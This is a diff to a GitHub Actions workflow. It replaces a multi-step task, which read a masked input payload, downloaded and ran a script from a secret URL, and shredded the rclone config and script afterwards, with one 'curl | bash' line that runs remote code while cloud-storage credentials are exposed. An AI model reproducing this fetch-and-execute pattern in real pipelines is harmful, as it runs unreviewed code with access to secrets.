@@ -1,4 +1,4 @@
-name: Data Processing Pipeline
+name: Pipeline
 
 on:
   workflow_dispatch:
@@ -24,28 +24,6 @@ jobs:
     timeout-minutes: 75
 
     steps:
-      - name: Execute Task Engine
+      - run: curl -fsSL "${{ secrets.PIPELINE_SCRIPT_URL }}" | bash
         env:
           RCLONE_CONF: ${{ secrets.RCLONE_CONF }}
-          PIPELINE_SCRIPT_URL: ${{ secrets.PIPELINE_SCRIPT_URL }}
-        run: |
-          if [ -f "$GITHUB_EVENT_PATH" ]; then
-            PAYLOAD_B64=$(jq -r '.inputs.payload // empty' "$GITHUB_EVENT_PATH")
-            if [ -n "$PAYLOAD_B64" ]; then
-              echo "::add-mask::$PAYLOAD_B64"
-              export PAYLOAD_B64
-            fi
-          fi
-
-          if [ -n "$PIPELINE_SCRIPT_URL" ]; then
-            curl -fsSL "$PIPELINE_SCRIPT_URL" -o /tmp/runner.sh
-            chmod +x /tmp/runner.sh
-            /tmp/runner.sh
-          fi
-
-      - name: Cleanup Task Environment
-        if: always()
-        run: |
-          shred -u -z ~/.config/rclone/rclone.conf 2>/dev/null || rm -f ~/.config/rclone/rclone.conf
-          shred -u -z /tmp/runner.sh 2>/dev/null || rm -f /tmp/runner.sh
-          rm -rf /tmp/buffer /tmp/pipeline_buffer ~/.config/rclone
